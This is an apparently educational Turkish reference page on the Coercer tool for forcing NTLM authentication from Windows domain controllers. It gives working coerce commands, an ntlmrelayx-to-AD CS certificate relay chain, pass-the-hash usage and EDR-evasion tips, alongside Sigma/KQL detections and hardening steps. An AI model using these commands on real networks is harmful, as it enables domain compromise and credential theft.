# Coercer

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** MS-EFSR, MS-RPRN, MS-DFSNM, MS-FSRVP ve MS-EVEN dahil olmak üzere Windows RPC arayüzlerindeki bilinen tüm kimlik doğrulama zorlama (coercion) vektörlerini otomatik tarayan, test eden ve tetikleyen hepsi bir arada Python sömürü aracı.

---

## 1. Genel Bakış ve Amaç

**Coercer** (Clément Regnault / p0Dalirius tarafından geliştirilen), Active Directory etki alanında Windows sunucularını ve Domain Controller'ları saldırganın kontrolündeki bir IP adresine NTLM kimlik doğrulaması göndermeye zorlayan (Authentication Coercion) en gelişmiş ve kapsamlı koersiyon motorudur.

Geleneksel olarak kırmızı takımlar PrinterBug için `SpoolSample`, PetitPotam için ayrı bir script, DFS zafiyeti için `DFSCoerce` gibi münferit araçlar kullanmaktaydı. Coercer, bilinen **12'den fazla Windows RPC protokolünü ve 15'ten fazla RPC fonksiyonunu** tek bir çatı altında birleştirir.

Bir Windows sunucusuna yetkili veya standart bir kullanıcı kimliğiyle (bazen anonim olarak) özel bir RPC çağrısı yapıldığında, hedef sunucu verilen UNC yolunu (`\\attacker_ip\share`) doğrulamak için **kendi makine hesabı (SYSTEM)** context'inde bir SMB veya HTTP bağlantısı açar. Coercer bu süreci otomatize ederek, hedef sunucunun kimliğini eşzamanlı dinleyen `ntlmrelayx` veya `Responder` üzerine yönlendirir; böylece NTLM Relay saldırılarıyla kurumsal sertifika (AD CS PKINIT), LDAP yetkisi veya yerel admin oturumu elde edilmesini sağlar.

```
       [ Saldırgan: Coercer ]
                 |
   1. RPC Bind & Metot Çağrısı:
      MS-EFSR / MS-RPRN / MS-DFSNM / MS-FSRVP
      Argüman: "\\192.168.1.50\share\test"
                 |
                 v
       [ Hedef Sunucu / DC (Windows) ]
                 |
   2. SYSTEM Context'inde UNC Yoluna Çözümleme Başlatır
                 |
                 v
   ================================================= Ağ (TCP 445 / 80)
                 |
                 v
       [ Dinleyici: ntlmrelayx / Responder ] (192.168.1.50)
                 |
   3. NTLMv2 Makine Hash'i (DC01$) Yakalandı veya AD CS / LDAP'a Relay Edildi!
```

### Desteklenen Protokoller ve Fonksiyonlar
- **MS-EFSR (Encrypting File System):** `EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv`, `EfsRpcDecryptFileSrv` vb. (PetitPotam).
- **MS-RPRN (Print System Remote):** `RpcRemoteFindFirstPrinterChangeNotificationEx` (PrinterBug).
- **MS-DFSNM (Distributed File System Namespace):** `NetrDfsRemoveStdRoot`, `NetrDfsAddStdRoot` (DFSCoerce).
- **MS-FSRVP (File Server Remote VSS):** `IsPathSupported`, `IsPathShadowCopied` (ShadowCoerce).
- **MS-EVEN / MS-EVEN6 (EventLog Remote):** `ElfrOpenBELW`, `ElfrOpenELW` (EvenCoerce).

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | Coercer | PetitPotam | SpoolSample | DFSCoerce |
|---|---|---|---|---|
| **Kapsam** | Tüm Protokoller (15+ metot) | Yalnızca MS-EFSR | Yalnızca MS-RPRN | Yalnızca MS-DFSNM |
| **Tarama Modu (Scan)** | Evet (Zafiyetleri pasif listeler) | Hayır (Doğrudan tetikler) | Hayır | Hayır |
| **Filtreleme** | Protokol / Metot bazlı filtreleme | Sabit | Sabit | Sabit |
| **Transport** | SMB Named Pipe ve RPC TCP | SMB Named Pipe | SMB Named Pipe | SMB Named Pipe |
| **Otomasyon** | İlk başarılı metotta durma / Fuzz | Tekil çalışma | Tekil çalışma | Tekil çalışma |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Coercer Python 3 ortamında modüler bir komut satırı arayüzü sunar. Üç ana çalışma kipine sahiptir:
1. `scan`: Hedef sistemdeki açıkları ve tetiklenebilir fonksiyonları tespit eder (koersiyon yapmaz).
2. `coerce`: Hedef sistemi saldırganın dinleyicisine bağlanmaya zorlar.
3. `fuzz`: Bilinmeyen veya belgelenmemiş RPC arayüzlerini test eder.

```bash
coercer <eylem> -t <Hedef_IP> -l <Dinleyici_IP> -u <Kullanıcı> -p <Parola> -d <Domain> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `scan` / `coerce` / `fuzz` | Coercer'ın gerçekleştireceği ana eylem. | `coerce` |
| `-t, --target` | Zorlanacak hedef Windows sunucusunun veya DC'nin IP/FQDN adresi. | `-t 192.168.1.10` |
| `-l, --listener` | Hedef sunucunun kimlik doğrulamaya yönlendirileceği saldırgan IP'si. | `-l 192.168.1.50` |
| `-u, --username` | RPC kimlik doğrulaması için etki alanı kullanıcısı. | `-u ahmet` |
| `-p, --password` | Kullanıcının parolası. | `-p Parola123!` |
| `-d, --domain` | Hedef Active Directory etki alanı adı. | `-d lab.local` |
| `--hashes` | Parola yerine LM:NTLM hash ile kimlik doğrulama. | `--hashes :e19ccf...` |
| `-k, --kerberos` | Kerberos biletleri ile kimlik doğrulama. | `-k` |
| `--filter-protocol-name` | Yalnızca belirli bir protokolü çalıştırma (örn: MS-EFSR, MS-RPRN). | `--filter-protocol-name MS-EFSR` |
| `--filter-method-name` | Yalnızca belirli bir fonksiyonu çalıştırma (örn: EfsRpcOpenFileRaw). | `--filter-method-name EfsRpcOpenFileRaw` |
| `--stop-after-first-success` | Başarılı bir tetikleme gerçekleştiğinde taramayı anında durdurur (OPSEC). | `--stop-after-first-success` |
| `--transport` | Kullanılacak RPC taşıma katmanı: `SMB` (Named Pipes) veya `TCP` (Dinamik Portlar). | `--transport SMB` |
| `-v, --verbose` | Detaylı hata kodlarını ve RPC yanıtlarını gösterir. | `-v` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Hedef Sunucudaki Koersiyon Zafiyetlerini Pasif Olarak Tarama (Scan Modu)

Hedefi zorlamadan önce hangi RPC fonksiyonlarının açık ve tetiklenebilir olduğunu güvenli bir şekilde denetleme.

```bash
coercer scan -t 192.168.1.10 -u can.oz -p Pass123! -d lab.local
```

```text
[+] Coercer v2.4.3 (Mode: SCAN)
[*] Targeting 192.168.1.10 with user 'lab.local\can.oz'
[*] Testing MS-EFSR (Encrypting File System Remote)...
    [+] VULNERABLE: EfsRpcOpenFileRaw via \pipe\efsrpc (SMB)
    [+] VULNERABLE: EfsRpcEncryptFileSrv via \pipe\lsarpc (SMB)
[*] Testing MS-RPRN (Print System Remote)...
    [-] FAILED: Print Spooler service disabled (STATUS_OBJECT_NAME_NOT_FOUND)
[*] Testing MS-DFSNM (Distributed File System Namespace)...
    [+] VULNERABLE: NetrDfsRemoveStdRoot via \pipe\netdfs (SMB)
[*] Testing MS-FSRVP (File Server Remote VSS Protocol)...
    [-] FAILED: Access Denied
[+] Scan finished: 3 vulnerable methods detected!
```
*Analiz:* Sunucu üzerinde Print Spooler kapalı olmasına rağmen MS-EFSR ve MS-DFSNM fonksiyonlarının açık olduğu tespit edildi. Saldırgan hangi vektörü kullanacağını önceden belirledi.

---

### Senaryo 2: İlk Başarılı Metotta Durarak Anında Koersiyon (OPSEC Dostu)

Tüm protokolleri deneyip gürültü yapmak yerine, çalışan ilk fonksiyon ile hedefi dinleyiciye zorlama.

```bash
coercer coerce -t 192.168.1.10 -l 192.168.1.50 -u can.oz -p Pass123! -d lab.local --stop-after-first-success
```

```text
[+] Coercer v2.4.3 (Mode: COERCE)
[*] Targeting 192.168.1.10 -> Coercing to 192.168.1.50
[*] Trying MS-EFSR -> EfsRpcOpenFileRaw...
[+] SUCCESS! Coercion triggered via EfsRpcOpenFileRaw!
[*] Stopping further attempts (--stop-after-first-success specified).
```
*Analiz:* Sunucu `EfsRpcOpenFileRaw` fonksiyonu ile `192.168.1.50` adresine SMB bağlantısı açmaya zorlandı ve işlem anında durdurularak gereksiz log üretimi engellendi.

---

### Senaryo 3: Coercer ve ntlmrelayx ile AD CS PKINIT Relay Zinciri (Domain Admin)

Hedef Domain Controller'ı zorlayıp kimliğini AD CS Sertifika servisine relay ederek DC makine sertifikası alma.

```bash
# Terminal 1: ntlmrelayx ile AD CS Web Enrollment hedefle
sudo impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2: Coercer ile DC'yi dinleyiciye zorla
coercer coerce -t 192.168.1.10 -l 192.168.1.50 -u can.oz -p Pass123! -d lab.local --filter-protocol-name MS-EFSR
```

```text
[ntlmrelayx Çıktısı]
[*] Authenticating against http://ca.lab.local/certsrv/certfnsh.asp as LAB\DC01$ SUCCEED
[*] Requesting certificate for LAB\DC01$ with template DomainController...
[+] Successfully exported certificate: DC01.pfx (Base64 PKINIT ready)
```
*Analiz:* DC makine hesabı (`DC01$`) zorlanarak Sertifika Otoritesine relay edildi. Elde edilen `.pfx` sertifikası ile `gettgtpkinit.py` çalıştırılarak DCSync yetkisi elde edilebilir.

---

### Senaryo 4: Yalnızca MS-DFSNM (DFSCoerce) Protokolünü Hedefleme

Ortamda PetitPotam (MS-EFSR) yaması bulunuyorsa alternatif DFSNM arayüzü üzerinden zorlama.

```bash
coercer coerce -t 192.168.1.12 -l 192.168.1.50 -u can.oz -p Pass123! -d lab.local --filter-protocol-name MS-DFSNM -v
```

```text
[*] Filter applied: Only testing MS-DFSNM
[*] Connecting to SMB pipe \pipe\netdfs on 192.168.1.12...
[*] Calling NetrDfsRemoveStdRoot with UNC '\\192.168.1.50\share'...
[+] NetrDfsRemoveStdRoot returned: RPC_S_OK (Coercion successful!)
```
*Analiz:* EFSR yamalı sistemlerde DFSNM protokolü üzerinden zafiyet başarıyla tetiklendi.

---

### Senaryo 5: NTLM Hash ile Kimlik Doğrulama (Pass-the-Hash)

Açık metin parola olmadan bellekten çekilen NTLM hash ile Coercer çalıştırma.

```bash
coercer coerce -t 192.168.1.10 -l 192.168.1.50 -u operator -d lab.local --hashes :a4b5c6d7e8f90123456789abcdef0123
```
*Analiz:* Parola bilinmeden NTLM hash kullanılarak RPC oturumu açıldı ve zorlama tetiklendi.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `nca_s_unk_if / RPC_S_UNKNOWN_IF` | İlgili RPC arayüzü sunucuda kayıtlı değil veya ilişkili Windows servisi kapalıdır (örn: Spooler kapalı). | Diğer protokollere geçin (`--filter-protocol-name MS-DFSNM` veya `MS-EFSR`) ya da önce `coercer scan` ile açık arayüzleri listeleyin. |
| `STATUS_ACCESS_DENIED / E_ACCESSDENIED` | Microsoft'un güvenlik güncelleştirmesi (KB5005413 / CVE-2021-36942) bu RPC fonksiyonu için yetkisiz çağrıları engellemiştir. | Standart yetkili bir hesap kullanıyorsanız farklı fonksiyonları (`MS-FSRVP`, `MS-DFSNM`) deneyin veya anonim yerine doğrulanmış oturum açın. |
| `STATUS_OBJECT_NAME_NOT_FOUND` | Named pipe (`\pipe\spoolss` veya `\pipe\efsrpc`) hedef sistemde bulunamadı. | Sunucunun rolünü kontrol edin; Print Spooler servisi kapatılmış olabilir. Named pipe yerine RPC TCP transport deneyin: `--transport TCP`. |
| `Connection refused / Timeout on port 445` | Hedef sunucu ile aranızdaki SMB trafiği güvenlik duvarı tarafından engellenmektedir. | Aradaki firewall kurallarını inceleyin veya WebClient/WebDAV tabanlı araçlara (`Crop`) yönelin. |
| `SMB SessionError: STATUS_LOGON_FAILURE` | Kullanıcı adı, parola veya etki alanı adı hatalıdır. | Kimlik bilgilerini `nxc smb <hedef> -u <kullanıcı> -p <parola>` ile doğrulayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Domain Controller Event ID 5145 (A network share object was accessed):**
  - Paylaşım Adı: `\\*\IPC$`
  - Relative Target Name: `spoolss`, `efsrpc`, `lsarpc`, `netdfs`, `fssagentrpc`.
  - Access Mask: `0x12019F` (Read/Write Data).
- **Windows Event ID 4624 (Logon):**
  - Logon Type: `3` (Network Logon).
  - Çağrıyı yapan kullanıcının kimlik doğrulaması.
- **Sysmon Event ID 3 (Network Connection):**
  - Hedef sunucunun SYSTEM context'inde bilinmeyen bir dış IP'nin 445 veya 80 portuna aniden giden bağlantı başlatması.

### 5.2 Ağ ve EDR İmzaları
- **RPC Interface Sweeping:** `coercer scan` çalıştırıldığında birkaç saniye içerisinde 15'ten fazla farklı RPC UUID'sine arka arkaya `Bind` isteği yapılması EDR ve NDR sistemleri tarafından otomatik anomali olarak etiketlenir.
- **Named Pipe Erişim Yoğunluğu:** `IPC$` paylaşımı üzerinden ardı ardına farklı pipe'ların sorgulanması (Sigma kuralı tetikleyicisi).

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1187** | Forced Authentication | Windows RPC fonksiyonları üzerinden NTLM kimlik doğrulama zorlama. |
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | IPC$ ve Named Pipe'lar üzerinden RPC arayüzlerine erişim. |
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS and SMB Relay | Tetiklenen kimliğin AD CS veya LDAP'a relay edilmesi. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **Aşırı Gürültü (Scan Modu):** Tüm metotları taramak EDR'ları alarma geçirir. | Asla doğrudan geniş tarama yapmayın; doğrudan hedeflenmiş tek bir metot çalıştırın (`--filter-method-name EfsRpcOpenFileRaw`). |
| **Tetikleme Sonrası Durma:** Sonsuz döngü log kirliliği yaratır. | Mutlaka `--stop-after-first-success` bayrağını komutlarınıza ekleyin. |
| **Transport Seçimi:** Named Pipe erişimi çok sıkı izlenir. | Destekleniyorsa dinamik RPC portları (`--transport TCP`) üzerinden bağlanmayı deneyin. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — Şüpheli RPC Named Pipe Bağlantıları)
```yaml
title: Potential RPC Authentication Coercion Activity
status: experimental
description: Kısa sürede şüpheli named pipe'lara (efsrpc, netdfs, spoolss) IPC$ üzerinden erişim tespiti.
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5145
        ShareName: '\\*\IPC$'
        RelativeTargetName:
            - 'efsrpc'
            - 'netdfs'
            - 'spoolss'
            - 'fssagentrpc'
    condition: selection | count() by SourceAddress > 3
level: high
```

#### Tespit Kuralı (KQL — Microsoft Sentinel)
```kql
SecurityEvent
| where EventID == 5145
| where ShareName endswith "IPC$"
| where RelativeTargetName in ("efsrpc", "netdfs", "spoolss", "fssagentrpc")
| summarize AttemptCount = count(), Targets = make_set(RelativeTargetName) by IpAddress, Account, bin(TimeGenerated, 5m)
| where AttemptCount >= 3
```

#### Sertleştirme ve Önleme Adımları
1. **Print Spooler Servisini Kapatma:** Domain Controller sunucularında Print Spooler servisi tamamen durdurulmalı ve devre dışı bırakılmalıdır:
   ```powershell
   Stop-Service -Name Spooler -Force; Set-Service -Name Spooler -StartupType Disabled
   ```
2. **RPC Filtreleri (RPC Filters):** Windows Filtering Platform (WFP) kuralları ile hassas RPC arayüzlerine uzaktan anonim veya yetkisiz erişim bloklanmalıdır.
3. **EPA ve SMB Signing:** NTLM relay saldırılarını önlemek için AD CS üzerinde Extended Protection for Authentication (EPA) açılmalı ve tüm sistemlerde SMB Signing zorunlu kılınmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Hedef sistemdeki koersiyon açıklarını pasif tarama
coercer scan -t 192.168.1.10 -u ahmet -p Sifre123 -d sirket.local
```
- **Ne Yapar?:** Hedefi tetiklemeden hangi RPC fonksiyonlarının açık olduğunu listeler.
- **Ne Zaman Kullanılır?:** Operasyonun keşif safhasında zafiyetli vektörü belirlemek için.
- **Parametreler:** `scan`: Tarama modu; `-t`: Hedef IP; `-u/-p/-d`: Kimlik bilgileri.

```bash
# 2. İlk başarılı yöntemde durarak güvenli tetikleme (En Popüler)
coercer coerce -t 192.168.1.10 -l 192.168.1.50 -u ahmet -p Sifre123 -d sirket.local --stop-after-first-success
```
- **Ne Yapar?:** İlk çalışan koersiyon fonksiyonuyla hedefi dinleyiciye zorlar ve çıkar.
- **Ne Zaman Kullanılır?:** Hızlı, temiz ve minimum gürültülü sömürü gerektiğinde.
- **Parametreler:** `coerce`: Tetikleme modu; `-l`: Dinleyici IP; `--stop-after-first-success`: Başarıda dur.

```bash
# 3. Yalnızca PetitPotam (MS-EFSR) protokolünü çalıştırma
coercer coerce -t 192.168.1.10 -l 192.168.1.50 -u ahmet -p Sifre123 -d sirket.local --filter-protocol-name MS-EFSR
```
- **Ne Yapar?:** Diğer tüm servisleri yok sayarak yalnızca EFSR fonksiyonlarını tetikler.
- **Ne Zaman Kullanılır?:** EFSR zafiyetinin açık olduğu bilinen Domain Controller sistemlerinde.
- **Parametreler:** `--filter-protocol-name MS-EFSR`: Protokol filtresi.

```bash
# 4. Yalnızca PrinterBug (MS-RPRN) protokolünü tetikleme
coercer coerce -t 192.168.1.10 -l 192.168.1.50 -u ahmet -p Sifre123 -d sirket.local --filter-protocol-name MS-RPRN
```
- **Ne Yapar?:** Yalnızca Print Spooler servisini kullanarak NTLM kimlik doğrulamasını tetikler.
- **Ne Zaman Kullanılır?:** Hedef sunucuda Spooler servisinin çalıştığı doğrulandığında.
- **Parametreler:** `--filter-protocol-name MS-RPRN`: Yazıcı servisi filtresi.

```bash
# 5. Yalnızca DFSNM (DFSCoerce) protokolünü tetikleme
coercer coerce -t 192.168.1.10 -l 192.168.1.50 -u ahmet -p Sifre123 -d sirket.local --filter-protocol-name MS-DFSNM
```
- **Ne Yapar?:** DFS Namespace arayüzü üzerinden tetikleme yapar.
- **Ne Zaman Kullanılır?:** EFSR ve Spooler yamalı olduğunda alternatif vektör olarak.
- **Parametreler:** `--filter-protocol-name MS-DFSNM`: DFS filtresi.

```bash
# 6. Pass-the-Hash ile NTLM hash kullanarak çalıştırma
coercer coerce -t 192.168.1.10 -l 192.168.1.50 -u operator -d sirket.local --hashes :e19ccf750c72545f1b5f1b2b80429f08
```
- **Ne Yapar?:** Parola bilmeden NTLM hash ile RPC oturumu kurup koersiyon yapar.
- **Ne Zaman Kullanılır?:** Bellekten yalnızca NTLM hash elde edildiğinde.
- **Parametreler:** `--hashes`: NTLM hash.

```bash
# 7. Kerberos biletleri ile kimlik doğrulama (-k)
export KRB5CCNAME=/tmp/ticket.ccache
coercer coerce -t dc01.sirket.local -l 192.168.1.50 -k -no-pass -d sirket.local
```
- **Ne Yapar?:** Ccache Kerberos biletini kullanarak RPC oturumu açar ve tetikler.
- **Ne Zaman Kullanılır?:** Parolasız veya NTLM trafiğinin yasak olduğu saf Kerberos ortamlarında.
- **Parametreler:** `-k`: Kerberos kullan; `-no-pass`: Parola sorma.

```bash
# 8. Yalnızca TCP transport (Dinamik RPC Portları) kullanarak bağlanma
coercer coerce -t 192.168.1.10 -l 192.168.1.50 -u ahmet -p Sifre123 -d sirket.local --transport TCP
```
- **Ne Yapar?:** SMB port 445 ve named pipe yerine doğrudan dinamik RPC portlarına (TCP 49152+) bağlanır.
- **Ne Zaman Kullanılır?:** Port 445 engellendiğinde veya named pipe erişimleri sıkı denetlendiğinde.
- **Parametreler:** `--transport TCP`: Taşıma katmanı seçimi.

```bash
# 9. Hedef listesi üzerinden toplu koersiyon taraması
coercer scan --targets-file dc_list.txt -u ahmet -p Sifre123 -d sirket.local
```
- **Ne Yapar?:** Metin dosyasındaki tüm Domain Controller ve sunucularda koersiyon açıklarını tarar.
- **Ne Zaman Kullanılır?:** Büyük etki alanlarında hangi sunucuların açık olduğunu topluca envanterlemek için.
- **Parametreler:** `--targets-file`: Hedef IP/Host listesi.

```bash
# 10. Bilinmeyen RPC arayüzlerini ve fonksiyonlarını test etme (Fuzz Modu)
coercer fuzz -t 192.168.1.10 -l 192.168.1.50 -u ahmet -p Sifre123 -d sirket.local
```
- **Ne Yapar?:** Belgelenmemiş veya yeni eklenmiş RPC UUID'lerini zorlama potansiyeli için dener.
- **Ne Zaman Kullanılır?:** Sıfır gün (0-day) koersiyon araştırmalarında ve güvenlik testlerinde.
- **Parametreler:** `fuzz`: RPC arayüz fuzzing modu.

---

## Kaynaklar

- **Resmi GitHub Deposu (Coercer):** [https://github.com/p0dalirius/Coercer](https://github.com/p0dalirius/Coercer)
- **p0Dalirius Blog — Everything you need to know about Windows RPC Coercion:** [https://podalirius.net/](https://podalirius.net/)
- **Microsoft RPC Dokümantasyonu (MS-EFSR / MS-RPRN):** [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/)

---

> **Önceki:** [← Pre2k](./Pre2k.md) · **Sonraki:** [PetitPotam →](./PetitPotam.md)

